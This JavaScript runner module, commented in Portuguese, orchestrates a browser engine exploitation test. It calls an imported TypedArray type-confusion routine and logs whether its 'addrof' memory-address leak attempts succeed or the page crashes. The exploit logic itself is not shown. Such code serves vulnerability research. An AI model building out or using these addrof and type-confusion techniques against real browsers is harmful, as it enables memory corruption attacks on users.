// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_PreConfuse,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PRECONF
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_PreConfuse";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (PreConfuse) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_PreConfuse(); 

    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.name === 'RangeError') {
            logS3(`     RangeError: Maximum call stack size exceeded OCORREU!`, "vuln", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-PC) RangeError!`; // PC para PreConfuse
         } else {
            document.title = `Heisenbug (TypedArray-PC) ERR: ${result.errorOccurred.name}`;
         }
    } else if (result.potentiallyCrashed) {
         logS3(`   RESULTADO: CONGELAMENTO POTENCIAL. Detalhes da toJSON: ${JSON.stringify(result.toJSON_details)}`, "critical", FNAME_RUNNER);
         if (!document.title.includes("CONGELOU")) document.title = `Heisenbug (TypedArray-PC) CRASH/FREEZE?`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        // Adicionar logs de sucesso/falha do addrof
        if (result.addrof_A_attempt_result && result.addrof_A_attempt_result.success) {
             logS3(`     ADDROF A (Pré-Confusão) SUCESSO! ${result.addrof_A_attempt_result.message}`, "vuln", FNAME_RUNNER);
        } else if (result.addrof_A_attempt_result) {
             logS3(`     ADDROF A (Pré-Confusão) FALHOU: ${result.addrof_A_attempt_result.message}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_attempt_result && result.addrof_B_attempt_result.success) {
             logS3(`     ADDROF B (Pré-Confusão) SUCESSO! ${result.addrof_B_attempt_result.message}`, "vuln", FNAME_RUNNER);
        } else if (result.addrof_B_attempt_result) {
             logS3(`     ADDROF B (Pré-Confusão) FALHOU: ${result.addrof_B_attempt_result.message}`, "warn", FNAME_RUNNER);
        }


        if (result.toJSON_details && result.toJSON_details.error_in_toJSON) {
            logS3(`     ERRO INTERNO NA toJSON: ${result.toJSON_details.error_in_toJSON}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-PC) toJSON_ERR`;
        } else if (result.toJSON_details && result.toJSON_details.probe_called && 
                    result.toJSON_details.this_type_in_toJSON === "[object Object]") {
            logS3(`     !!!! TYPE CONFUSION OBSERVADA NA SONDA !!!! Tipo de 'this' na última sonda: ${result.toJSON_details.this_type_in_toJSON}`, "critical", FNAME_RUNNER);
             if (result.toJSON_details.this_was_victim_ref_at_confusion !== null) {
                logS3(`       Na última sonda confusa, 'this' === victim_typed_array_ref_v4pc? ${result.toJSON_details.this_was_victim_ref_at_confusion}`, "info");
            }
            // O título principal será definido pela lógica de addrof
            if (! (result.addrof_A_attempt_result && result.addrof_A_attempt_result.success) && !(result.addrof_B_attempt_result && result.addrof_B_attempt_result.success)) {
                 document.title = `Heisenbug (TypedArray-PC) TYPE CONFUSION (sonda)`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PRECONF) || document.title.includes("Probing")) {
             if (! (result.addrof_A_attempt_result && result.addrof_A_attempt_result.success) && !(result.addrof_B_attempt_result && result.addrof_B_attempt_result.success)) {
                document.title = `Heisenbug (TypedArray-PC) Test OK`;
             }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug com TypedArray Vítima (PreConfuse) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PRECONF}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (PreConfuse) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PRECONF)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && !document.title.includes("SUCCESS") && !document.title.includes("ERR") && !document.title.includes("TYPE CONFUSION")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PRECONF} Concluído`;
        }
    }
}
